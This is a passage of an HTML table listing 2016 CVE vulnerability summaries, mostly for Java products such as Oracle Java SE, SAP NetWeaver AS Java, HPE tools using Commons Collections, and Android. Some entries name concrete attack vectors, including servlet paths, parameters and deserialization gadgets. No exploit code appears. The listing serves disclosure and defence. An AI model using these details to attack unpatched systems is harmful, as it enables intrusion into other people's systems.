		<td valign="top">IBM WebSphere Application Server (WAS) 7.0 before 7.0.0.43, 8.0 before 8.0.0.13, 8.5 before 8.5.5.11, 9.0 before 9.0.0.2, and Liberty before 16.0.0.4 allows remote authenticated users to execute arbitrary Java code via a crafted serialized object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5725">CVE-2016-5725</a></td>
		<td valign="top">Directory traversal vulnerability in JCraft JSch before 0.1.54 on Windows, when the mode is ChannelSftp.OVERWRITE, allows remote SFTP servers to write to arbitrary files via a ..\ (dot dot backslash) in a response to a recursive GET command.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5597">CVE-2016-5597</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u121, 7u111, 8u102; and Java SE Embedded 8u101 allows remote attackers to affect confidentiality via vectors related to Networking.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5582">CVE-2016-5582</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u121, 7u111, 8u102; and Java SE Embedded 8u101 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Hotspot, a different vulnerability than CVE-2016-5573.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5573">CVE-2016-5573</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u121, 7u111, 8u102; and Java SE Embedded 8u101 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Hotspot, a different vulnerability than CVE-2016-5582.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5568">CVE-2016-5568</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u121, 7u111, and 8u102 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5556">CVE-2016-5556</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u121, 7u111, and 8u102 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5554">CVE-2016-5554</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u121, 7u111, 8u102; and Java SE Embedded 8u101 allows remote attackers to affect integrity via vectors related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5552">CVE-2016-5552</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111; JRockit: R28.3.12. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded, JRockit accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS v3.0 Base Score 5.3 (Integrity impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5549">CVE-2016-5549</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 7u121 and 8u112; Java SE Embedded: 8u111. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS v3.0 Base Score 6.5 (Confidentiality impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5548">CVE-2016-5548</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS v3.0 Base Score 6.5 (Confidentiality impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5547">CVE-2016-5547</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 7u121 and 8u112; Java SE Embedded: 8u111; JRockit: R28.3.12. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS v3.0 Base Score 5.3 (Availability impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5546">CVE-2016-5546</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111; JRockit: R28.3.12. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded, JRockit accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS v3.0 Base Score 7.5 (Integrity impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5542">CVE-2016-5542</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u121, 7u111, 8u102; and Java SE Embedded 8u101 allows remote attackers to affect integrity via vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5536">CVE-2016-5536</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle Platform Security for Java component in Oracle Fusion Middleware 12.1.3.0.0, 12.2.1.0.0, and 12.2.1.1.0 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2016-8281.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5523">CVE-2016-5523</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle Agile PLM component in Oracle Supply Chain Products Suite 9.3.4 and 9.3.5 allows remote authenticated users to affect confidentiality, integrity, and availability via vectors related to AutoVue Java Applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5519">CVE-2016-5519</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle GlassFish Server component in Oracle Fusion Middleware 2.1.1, 3.0.1, and 3.1.2 allows remote authenticated users to affect confidentiality, integrity, and availability via vectors related to Java Server Faces.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5062">CVE-2016-5062</a></td>
		<td valign="top">The web server in Aternity before 9.0.1 does not require authentication for getMBeansFromURL loading of Java MBeans, which allows remote attackers to execute arbitrary Java code by registering MBeans.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5016">CVE-2016-5016</a></td>
		<td valign="top">Pivotal Cloud Foundry 239 and earlier, UAA (aka User Account and Authentication Server) 3.4.1 and earlier, UAA release 12.2 and earlier, PCF (aka Pivotal Cloud Foundry) Elastic Runtime 1.6.x before 1.6.35, and PCF Elastic Runtime 1.7.x before 1.7.13 does not validate if a certificate is expired.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5003">CVE-2016-5003</a></td>
		<td valign="top">The Apache XML-RPC (aka ws-xmlrpc) library 3.1.3, as used in Apache Archiva, allows remote attackers to execute arbitrary code via a crafted serialized Java object in an &lt;ex:serializable&gt; element.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4999">CVE-2016-4999</a></td>
		<td valign="top">SQL injection vulnerability in the getStringParameterSQL method in main/java/org/dashbuilder/dataprovider/sql/dialect/DefaultDialect.java in Dashbuilder before 0.6.0.Beta1 allows remote attackers to execute arbitrary SQL commands via a data set lookup filter in the (1) Data Set Authoring or (2) Displayer editor UI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4432">CVE-2016-4432</a></td>
		<td valign="top">The AMQP 0-8, 0-9, 0-91, and 0-10 connection handling in Apache Qpid Java before 6.0.3 might allow remote attackers to bypass authentication and consequently perform actions via vectors related to connection state logging.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4405">CVE-2016-4405</a></td>
		<td valign="top">A remote code execution vulnerability was identified in HP Business Service Management (BSM) using Apache Commons Collection Java Deserialization versions v9.20-v9.26

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4398">CVE-2016-4398</a></td>
		<td valign="top">A remote arbitrary code execution vulnerability was identified in HP Network Node Manager i (NNMi) Software 10.00, 10.01 (patch1), 10.01 (patch 2), 10.10 using Java Deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4385">CVE-2016-4385</a></td>
		<td valign="top">The RMI service in HP Network Automation Software 9.1x, 9.2x, 10.0x before 10.00.02.01, and 10.1x before 10.11.00.01 allows remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) and Commons BeanUtils libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4373">CVE-2016-4373</a></td>
		<td valign="top">The AdminUI in HPE Operations Manager (OM) before 9.21.130 on Linux, Unix, and Solaris allows remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4372">CVE-2016-4372</a></td>
		<td valign="top">HPE iMC PLAT before 7.2 E0403P04, iMC EAD before 7.2 E0405P05, iMC APM before 7.2 E0401P04, iMC NTA before 7.2 E0401P01, iMC BIMS before 7.2 E0402P02, and iMC UAM_TAM before 7.2 E0405P05 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4369">CVE-2016-4369</a></td>
		<td valign="top">HPE Discovery and Dependency Mapping Inventory (DDMi) 9.30, 9.31, 9.32, 9.32 update 1, 9.32 update 2, and 9.32 update 3 allows remote authenticated users to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4368">CVE-2016-4368</a></td>
		<td valign="top">HPE Universal CMDB 10.0 through 10.21, Universal CMDB Configuration Manager 10.0 through 10.21, and Universal Discovery 10.0 through 10.21 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4327">CVE-2016-4327</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in WSO2 SOA Enablement Server for Java/6.6 build SSJ-6.6-20090827-1616 and earlier allows remote attackers to inject arbitrary web script or HTML via the PATH_INFO.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4216">CVE-2016-4216</a></td>
		<td valign="top">XMPCore in Adobe XMP Toolkit for Java before 5.1.3 allows remote attackers to read arbitrary files via XML data containing an external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4015">CVE-2016-4015</a></td>
		<td valign="top">The Enqueue Server in SAP NetWeaver JAVA AS 7.1 through 7.4 allows remote attackers to cause a denial of service (process crash) via a crafted request, aka SAP Security Note 2258784.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-4014">CVE-2016-4014</a></td>
		<td valign="top">XML external entity (XXE) vulnerability in the UDDI component in SAP NetWeaver JAVA AS 7.4 allows remote attackers to cause a denial of service (system hang) via a crafted DTD in an XML request to uddi/api/replication, aka SAP Security Note 2254389.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3980">CVE-2016-3980</a></td>
		<td valign="top">The Java Startup Framework (aka jstart) in SAP JAVA AS 7.2 through 7.4 allows remote attackers to cause a denial of service (process crash) via a crafted HTTP request, aka SAP Security Note 2259547.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3979">CVE-2016-3979</a></td>
		<td valign="top">Internet Communication Manager (aka ICMAN or ICM) in SAP JAVA AS 7.2 through 7.4 allows remote attackers to cause a denial of service (heap memory corruption and process crash) via a crafted HTTP request, related to the IctParseCookies function, aka SAP Security Note 2256185.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3976">CVE-2016-3976</a></td>
		<td valign="top">Directory traversal vulnerability in SAP NetWeaver AS Java 7.1 through 7.5 allows remote attackers to read arbitrary files via a ..\ (dot dot backslash) in the fileName parameter to CrashFileDownloadServlet, aka SAP Security Note 2234971.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3975">CVE-2016-3975</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in SAP NetWeaver AS Java 7.1 through 7.5 allows remote attackers to inject arbitrary web script or HTML via the navigationTarget parameter to irj/servlet/prt/portal/prteventname/XXX/prtroot/com.sapportals.navigation.testComponent.NavigationURLTester, aka SAP Security Note 2238375.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3974">CVE-2016-3974</a></td>
		<td valign="top">XML external entity (XXE) vulnerability in the Configuration Wizard in SAP NetWeaver Java AS 7.1 through 7.5 allows remote attackers to cause a denial of service, conduct SMB Relay attacks, or access arbitrary files via a crafted XML request to _tc~monitoring~webservice~web/ServerNodesWSService, aka SAP Security Note 2235994.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3973">CVE-2016-3973</a></td>
		<td valign="top">The chat feature in the Real-Time Collaboration (RTC) services 7.3 and 7.4 in SAP NetWeaver Java AS 7.1 through 7.5 allows remote attackers to obtain sensitive user information by visiting webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Chat#, pressing "Add users", and doing a search, aka SAP Security Note 2255990.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3911">CVE-2016-3911</a></td>
		<td valign="top">core/java/android/os/Process.java in Zygote in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, 6.x before 2016-10-01, and 7.0 before 2016-10-01 allows attackers to gain privileges via a crafted application, aka internal bug 30143607.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3890">CVE-2016-3890</a></td>
		<td valign="top">The Java Debug Wire Protocol (JDWP) implementation in adb/sockets.cpp in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-09-01 mishandles socket close operations, which allows attackers to gain privileges via a crafted application, aka internal bug 28347842.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3685">CVE-2016-3685</a></td>
		<td valign="top">SAP Download Manager 2.1.142 and earlier generates an encryption key from a small key space on Windows and Mac systems, which allows context-dependent attackers to obtain sensitive configuration information by leveraging knowledge of a hardcoded key in the program code and a computer BIOS serial number, aka SAP Security Note 2282338.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3684">CVE-2016-3684</a></td>
		<td valign="top">SAP Download Manager 2.1.142 and earlier uses a hardcoded encryption key to protect stored data, which allows context-dependent attackers to obtain sensitive configuration information by leveraging knowledge of this key, aka SAP Security Note 2282338.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3642">CVE-2016-3642</a></td>
		<td valign="top">The RMI service in SolarWinds Virtualization Manager 6.3.1 and earlier allows remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3610">CVE-2016-3610</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u92 and Java SE Embedded 8u91 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Libraries, a different vulnerability than CVE-2016-3598.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3606">CVE-2016-3606</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u101 and 8u92 and Java SE Embedded 8u91 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3598">CVE-2016-3598</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u92 and Java SE Embedded 8u91 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Libraries, a different vulnerability than CVE-2016-3610.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3587">CVE-2016-3587</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u92 and Java SE Embedded 8u91 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3552">CVE-2016-3552</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u92 allows local users to affect confidentiality, integrity, and availability via vectors related to Install.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3550">CVE-2016-3550</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u115, 7u101, and 8u92 and Java SE Embedded 8u91 allows remote attackers to affect confidentiality via vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3511">CVE-2016-3511</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u101 and 8u92 allows local users to affect confidentiality, integrity, and availability via vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3508">CVE-2016-3508</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u115, 7u101, and 8u92; Java SE Embedded 8u91; and JRockit R28.3.10 allows remote attackers to affect availability via vectors related to JAXP, a different vulnerability than CVE-2016-3500.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3503">CVE-2016-3503</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u115, 7u101, and 8u92 allows local users to affect confidentiality, integrity, and availability via vectors related to Install.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3500">CVE-2016-3500</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u115, 7u101, and 8u92; Java SE Embedded 8u91; and JRockit R28.3.10 allows remote attackers to affect availability via vectors related to JAXP, a different vulnerability than CVE-2016-3508.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3498">CVE-2016-3498</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u101 and 8u92 allows remote attackers to affect availability via vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3485">CVE-2016-3485</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u115, 7u101, and 8u92; Java SE Embedded 8u91; and JRockit R28.3.10 allows local users to affect integrity via vectors related to Networking.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3458">CVE-2016-3458</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u115, 7u101, and 8u92; and Java SE Embedded 8u91 allows remote attackers to affect integrity via vectors related to CORBA.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3454">CVE-2016-3454</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3449">CVE-2016-3449</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u113, 7u99, and 8u77 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3443">CVE-2016-3443</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u113, 7u99, and 8u77 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to 2D.  NOTE: the previous information is from the April 2016 CPU. Oracle has not commented on third-party claims that this issue allows remote attackers to obtain sensitive information via crafted font data, which triggers an out-of-bounds read.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3427">CVE-2016-3427</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u113, 7u99, and 8u77; Java SE Embedded 8u77; and JRockit R28.3.9 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3426">CVE-2016-3426</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u77 and Java SE Embedded 8u77 allows remote attackers to affect confidentiality via vectors related to JCE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3425">CVE-2016-3425</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u113, 7u99, and 8u77; Java SE Embedded 8u77; and JRockit R28.3.9 allows remote attackers to affect availability via vectors related to JAXP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3422">CVE-2016-3422</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u113, 7u99, and 8u77 allows remote attackers to affect availability via vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3097">CVE-2016-3097</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in spacewalk-java in Red Hat Satellite 5.7 allows remote attackers to inject arbitrary web script or HTML via a group name, related to viewing snapshot data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3094">CVE-2016-3094</a></td>
		<td valign="top">PlainSaslServer.java in Apache Qpid Java before 6.0.3, when the broker is configured to allow plaintext passwords, allows remote attackers to cause a denial of service (broker termination) via a crafted authentication attempt, which triggers an uncaught exception.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-3080">CVE-2016-3080</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in spacewalk-java in Red Hat Satellite 5.7 allows remote attackers to inject arbitrary web script or HTML via the (1) RHNMD User or (2) Filesystem parameters, related to display of monitoring probes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2961">CVE-2016-2961</a></td>
		<td valign="top">The integration server in IBM Integration Bus 9 before 9.0.0.6 and 10 before 10.0.0.5 and WebSphere Message Broker 8 before 8.0.0.8 allows remote attackers to obtain sensitive Tomcat version information by sending a malformed POST request and then reading the Java stack trace.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2833">CVE-2016-2833</a></td>
		<td valign="top">Mozilla Firefox before 47.0 ignores Content Security Policy (CSP) directives for cross-domain Java applets, which makes it easier for remote attackers to conduct cross-site scripting (XSS) attacks via a crafted applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2510">CVE-2016-2510</a></td>
		<td valign="top">BeanShell (bsh) before 2.0b6, when included on the classpath by an application that uses Java serialization or XStream, allows remote attackers to execute arbitrary code via crafted serialized data, related to XThis.Handler.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2497">CVE-2016-2497</a></td>
		<td valign="top">services/core/java/com/android/server/pm/PackageManagerService.java in the framework APIs in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-08-01 allows attackers to increase intent-filter priority via a crafted application, aka internal bug 27450489.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2397">CVE-2016-2397</a></td>
		<td valign="top">The cliserver implementation in Dell SonicWALL GMS, Analyzer, and UMA EM5000 7.2, 8.0, and 8.1 before Hotfix 168056 allows remote attackers to deserialize and execute arbitrary Java code via crafted XML data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2388">CVE-2016-2388</a></td>
		<td valign="top">The Universal Worklist Configuration in SAP NetWeaver AS JAVA 7.4 allows remote attackers to obtain sensitive user information via a crafted HTTP request, aka SAP Security Note 2256846.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2387">CVE-2016-2387</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the Java Proxy Runtime ProxyServer servlet in SAP NetWeaver 7.4 allow remote attackers to inject arbitrary web script or HTML via the (1) ns or (2) interface parameter to ProxyServer/register, aka SAP Security Note 2220571.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-2386">CVE-2016-2386</a></td>
		<td valign="top">SQL injection vulnerability in the UDDI server in SAP NetWeaver J2EE Engine 7.40 allows remote attackers to execute arbitrary SQL commands via unspecified vectors, aka SAP Security Note 2101079.

</td>
	</tr>
	<tr>
